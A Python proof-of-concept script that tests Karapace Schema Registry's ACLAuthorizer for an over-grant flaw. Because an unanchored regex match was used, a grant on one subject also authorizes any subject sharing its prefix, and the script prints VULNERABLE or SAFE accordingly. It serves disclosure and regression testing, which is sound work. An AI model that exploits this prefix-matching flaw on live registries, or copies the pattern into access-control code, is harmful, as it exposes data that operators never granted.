#!/usr/bin/env python3
"""
PoC: Karapace Schema Registry ACL over-grant via unanchored regex match.

Exercises the REAL karapace.core.auth.ACLAuthorizer with the exact call the FastAPI
subject routers make:

    authorizer.check_authorization(user, Operation.Read, f"Subject:{subject}")

An operator grants a user Read on the literal resource "Subject:orders". Because
ACLAuthorizer._check_resources used re.Pattern.match() (anchored only at the START of
the string), the same grant also authorizes any resource that shares that prefix
(e.g. "Subject:orders-secret"). The fix is re.Pattern.fullmatch().

The script only stubs karapace.core.stats (which drags in the OpenTelemetry stack);
everything under test is the project's own code. It prints the authorization matrix and
exits non-zero when a leak is detected, so it reports VULNERABLE on the affected code and
SAFE once fixed.

Usage:
    PYTHONPATH=src python3 poc/karapace_acl_authz_poc.py

To see the vulnerable behaviour on an unpatched checkout:
    git stash   # or: git checkout <commit-before-fix> -- src/karapace/core/auth.py
    PYTHONPATH=src python3 poc/karapace_acl_authz_poc.py   # -> VULNERABLE (exit 1)
"""

from __future__ import annotations

import re
import sys
import types

# Stub only the otel-heavy stats module so auth.py imports in a bare environment.
_stats = types.ModuleType("karapace.core.stats")
_stats.StatsClient = type("StatsClient", (), {})
sys.modules.setdefault("karapace.core.stats", _stats)

from karapace.core.auth import ACLAuthorizer, ACLEntry, HashAlgorithm, Operation, User  # noqa: E402


def main() -> int:
    # Operator intent: grant "alice" read access to exactly the subject "orders".
    granted_pattern = "Subject:orders"
    alice = User(username="alice", algorithm=HashAlgorithm.SHA256, salt="s", password_hash="h")
    authorizer = ACLAuthorizer(
        user_db={"alice": alice},
        permissions=[ACLEntry("alice", Operation.Read, re.compile(granted_pattern))],
    )

    print(f"Granted ACL: user=alice op=Read resource_pattern={granted_pattern!r}\n")
    print("Raw regex semantics being relied on:")
    print(f"  re.match({granted_pattern!r}, 'Subject:orders-secret')     -> {re.match(granted_pattern, 'Subject:orders-secret')}")
    print(f"  re.fullmatch({granted_pattern!r}, 'Subject:orders-secret')  -> {re.fullmatch(granted_pattern, 'Subject:orders-secret')}\n")

    # (resource that the router builds, expected authorization for the operator's intent)
    matrix = [
        ("Subject:orders", True),  # the exact subject alice was granted
        ("Subject:orders-secret", False),  # a DIFFERENT, sensitive subject
        ("Subject:orders-pii", False),  # a DIFFERENT, sensitive subject
        ("Subject:ordersX", False),  # a DIFFERENT subject
    ]

    print("check_authorization(alice, Read, <resource>)   [the exact router call]:")
    leaks = []
    for resource, expected in matrix:
        allowed = authorizer.check_authorization(user=alice, operation=Operation.Read, resource=resource)
        tag = "OK" if allowed == expected else "LEAK"
        if allowed != expected:
            leaks.append(resource)
        print(f"  [{tag:4}] resource={resource!r:26} authorized={allowed!s:5} (expected {expected})")

    print()
    if leaks:
        print("RESULT: VULNERABLE")
        print(f"  A grant for {granted_pattern!r} also authorized: {', '.join(leaks)}")
        print("  -> a user can read/write sibling subjects the operator never granted.")
        return 1
    print("RESULT: SAFE — only the exact granted resource is authorized.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
